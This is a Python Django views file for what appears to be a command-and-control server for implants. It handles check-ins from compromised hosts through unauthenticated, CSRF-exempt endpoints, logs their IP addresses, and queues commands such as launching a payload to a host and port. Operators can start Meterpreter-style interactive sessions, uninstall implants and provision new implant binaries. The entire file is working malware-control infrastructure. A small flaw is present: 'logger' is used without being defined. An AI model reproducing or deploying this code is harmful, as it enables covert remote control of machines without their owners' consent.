import json

from django.conf import settings
from django.views.generic import ListView, UpdateView, View, DetailView, FormView, DeleteView, CreateView
from django.shortcuts import get_object_or_404
from django.core.urlresolvers import reverse_lazy
from django.utils.decorators import method_decorator
from django.views.decorators.csrf import csrf_exempt
from django.http import JsonResponse, HttpResponseRedirect, HttpResponse
from braces.views import LoginRequiredMixin

from .models import Implant, Group, Command, ProvisionedBinary


class ImplantListView(LoginRequiredMixin, ListView):
	model = Implant
	ordering = ['-last_beacon']


class ImplantListByGroupView(LoginRequiredMixin, ListView):
	model = Implant
	ordering = ['-last_beacon']
	template_name = 'implant/implant_list_by_group.html'

	def get_queryset(self):
		self.group = get_object_or_404(Group, slug=self.args[0])
		return Implant.objects.filter(group=self.group)

	def get_context_data(self, **kwargs):
		context = super(ImplantListByGroupView, self).get_context_data(**kwargs)
		context['group'] = self.group
		return context


class ImplantUpdateView(LoginRequiredMixin, UpdateView):
	model = Implant
	success_url = reverse_lazy('implant:list')
	fields = [
		'group',
		'label',
		'beacon_interval',
		'beacon_jitter',
		'relay_host',
		'relay_port',
	]


class GroupListView(LoginRequiredMixin, ListView):
	model = Group
	ordering = ['label']


class GroupUpdateView(LoginRequiredMixin, UpdateView):
	model = Group
	ordering = ['label']
	fields = ['label', 'slug']

	def get_success_url(self):
		return reverse_lazy('implant:list_by_group', args=[self.object.slug])


class GroupCreateView(LoginRequiredMixin, CreateView):
	model = Group
	success_url = reverse_lazy('implant:group_list')
	fields = ('label',)


class ImplantBeaconView(View):
	@method_decorator(csrf_exempt)
	def dispatch(self, request, *args, **kwargs):
		return super(ImplantBeaconView, self).dispatch(request, *args, **kwargs)

	def get(self, request, *args, **kwargs):
		return HttpResponse('')

	def post(self, request, *args, **kwargs):
		# Example initial beacon:
		# {
		# 	"id": "<uuid>",
		#	"group": "<string>",
		#	"beacon_interval": <int>,
		#	"beacon_jitter": <int>,
		#	"relay_host": "<string>",
		#	"relay_port": <int>
		# }
		#
		# Example recurring beacon:
		# {
		#	"id": "<uuid>"
		# }
		#
		# The recurring beacon may optionally contain the settings fields
		# from the initial checkin, which will update the settings in the database.
		#
		# The response will be a list of commands. Example:
		# [
		#	{
		#		"id": "<uuid>",
		#		"command": "change_setting",
		#		"argument": "beacon_interval=300"
		#	}, {
		#		"id": "<uuid>",
		#		"command": "launch_payload",
		#		"argument": "10.0.0.5:4444"
		#	}
		# ]
		
		# Parse the request body, grab the implant ID
		# If we don't recognize the ID, create a new Implant object.
		# Update the last_beacon field
		# Check for setting names, and update the Implant object if applicable.
		# Grab a list of commands for the implant and return them in JSON format.

		beacon_data = json.loads(request.body)
		if 'id' not in beacon_data.keys():
			raise Exception('Missing id field')

		uuid = beacon_data['id']
		try:
			implant = Implant.objects.get(uuid=uuid)
		except Implant.DoesNotExist:
			implant = Implant()
			implant.uuid = uuid

		if 'HTTP_X_FORWARDED_FOR' in request.META.keys():
			implant.ip_address = request.META['HTTP_X_FORWARDED_FOR']
		else:
			implant.ip_address = request.META.get('REMOTE_ADDR', None)

		# Check for settings
		if 'group' in beacon_data.keys():
			group_name = beacon_data['group']

			try:
				implant.group = Group.objects.get(slug=group_name)
			except Group.DoesNotExist:
				group = Group()
				group.slug = group_name
				group.label = group_name
				group.save()

				implant.group = group

		if 'beacon_interval' in beacon_data.keys():
			implant.beacon_interval = beacon_data['beacon_interval']
		if 'beacon_jitter' in beacon_data.keys():
			implant.beacon_jitter = beacon_data['beacon_jitter']
		if 'relay_host' in beacon_data.keys():
			implant.relay_host = beacon_data['relay_host']
		if 'relay_port' in beacon_data.keys():
			implant.relay_port = beacon_data['relay_port']

		implant.save(create_change_setting_commands=False)

		commands = implant.beacon()
		return JsonResponse(commands, safe=False)


class AcknowledgeCommandsView(View):
	@method_decorator(csrf_exempt)
	def dispatch(self, request, *args, **kwargs):
		return super(AcknowledgeCommandsView, self).dispatch(request, *args, **kwargs)

	def post(self, request, *args, **kwargs):
		command_data = json.loads(request.body)
		if 'id' not in command_data.keys():
			raise Exception('Missing id field')

		uuid = command_data['id']
		implant = Implant.objects.get(uuid=uuid)

		if 'success_commands' not in command_data.keys():
			raise Exception('Missing success_commands field')

		for command_id in command_data['success_commands']:
			try:
				command = Command.objects.get(implant=implant, uuid=command_id)
			except Command.DoesNotExist:
				logger.error('Command {uuid} for {implant} does not exist'.format(uuid=command_id, implant=implant))
				continue

			command.resolve()

		if 'error_commands' in command_data.keys():
			for command_id in command_data['error_commands']:
				try:
					command = Command.objects.get(implant=implant, uuid=command_id)
				except Command.DoesNotExist:
					logger.error('Command {uuid} for {implant} does not exist'.format(uuid=command_id, implant=implant))
					continue

				command.resolve(error=True)

		return JsonResponse({})


class GoInteractiveView(LoginRequiredMixin, DetailView):
	template_name = 'implant/go_interactive.html'
	model = Implant

	def get_success_url(self):
		return reverse_lazy('implant:list')

	def get_context_data(self, **kwargs):
		context = super(GoInteractiveView, self).get_context_data(**kwargs)
		context['handler_host'] = settings.HANDLER_HOST
		context['handler_port'] = settings.HANDLER_PORT
		return context

	def post(self, request, *args, **kwargs):
		self.object = self.get_object()
		self.object.launch_payload(settings.METERPROXY_URL)
		return HttpResponseRedirect(self.get_success_url())


class EndInteractiveView(LoginRequiredMixin, DetailView):
	template_name = 'implant/end_interactive.html'
	model = Implant

	def get_success_url(self):
		return reverse_lazy('implant:list')

	def post(self, request, *args, **kwargs):
		self.object = self.get_object()
		self.object.end_interactive_session()
		return HttpResponseRedirect(self.get_success_url())


class UninstallView(LoginRequiredMixin, DetailView):
	template_name = 'implant/uninstall.html'
	model = Implant

	def get_success_url(self):
		return reverse_lazy('implant:list')

	def post(self, request, *args, **kwargs):
		self.object = self.get_object()
		self.object.uninstall()
		return HttpResponseRedirect(self.get_success_url())


class ProvisionedBinaryListView(LoginRequiredMixin, ListView):
	model = ProvisionedBinary


class ProvisionedBinaryDeleteView(LoginRequiredMixin, DeleteView):
	model = ProvisionedBinary
	success_url = reverse_lazy('implant:binaries_list')


class ProvisionedBinaryCreateView(LoginRequiredMixin, CreateView):
	model = ProvisionedBinary
	success_url = reverse_lazy('implant:binaries_list')
	fields = ('label', 'binary_type', 'beacon_time', 'beacon_jitter', 'local_port', 'relay_url', 'group')
